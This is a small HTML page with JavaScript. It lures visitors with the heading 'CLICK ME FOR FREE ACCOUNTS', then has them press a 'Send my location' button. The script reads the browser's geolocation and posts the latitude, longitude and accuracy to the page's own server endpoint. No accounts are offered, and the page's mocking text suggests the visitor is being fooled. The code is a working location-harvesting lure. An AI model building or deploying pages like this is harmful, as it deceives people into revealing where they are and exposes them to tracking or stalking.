<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>HEY WHATS UP!</title>
  <style>
    body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:40px;background:#f7fafc;color:#0f172a}
    .card{max-width:560px;margin:0 auto;padding:24px;border-radius:12px;background:white;box-shadow:0 6px 18px rgba(2,6,23,0.08)}
    button{padding:10px 14px;border-radius:8px;border:0;background:#2563eb;color:white;font-weight:600;cursor:pointer}
    .muted{color:#6b7280;font-size:0.9rem}
  </style>
</head>
<body>
  <main class="card">
    <h1>CLICK ME FOR FREE ACCOUNTS</h1>
    <p class="muted">MADE BY JIAN ILOVEYOU GOODLUCK</p>

    <div style="margin-top:18px;display:flex;gap:8px;align-items:center">
      <button id="sendBtn">Send my location</button>
      <div id="status" class="muted">idle</div>
    </div>

    <hr style="margin:18px 0"> 
    <div class="muted">GOODLUCK HAHAAH</div>
  </main>

  <script>
    const sendBtn = document.getElementById('sendBtn')
    const status = document.getElementById('status')

    function setStatus(t){ status.textContent = t }

    async function sendLocationToServer(lat, lon, accuracy){
      setStatus('sending...')
      try{
        const res = await fetch('/api/sendLocation', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ latitude: lat, longitude: lon, accuracy })
        })
        const j = await res.json()
        if(res.ok) setStatus('sent ✔️')
        else setStatus('error: ' + (j.error||res.status))
      }catch(e){
        setStatus('network error')
      }
    }

    sendBtn.addEventListener('click', async () => {
      if(!navigator.geolocation){ setStatus('Geolocation not supported') ; return }
      setStatus('requesting permission...')
      navigator.geolocation.getCurrentPosition(async (pos) => {
        const { latitude, longitude, accuracy } = pos.coords
        setStatus('got location — ' + latitude.toFixed(5) + ', ' + longitude.toFixed(5))
        await sendLocationToServer(latitude, longitude, accuracy)
      }, (err) => {
        setStatus('permission denied or error')
        console.error(err)
      }, { enableHighAccuracy: false, timeout: 15000 })
    })
  </script>
</body>
</html>
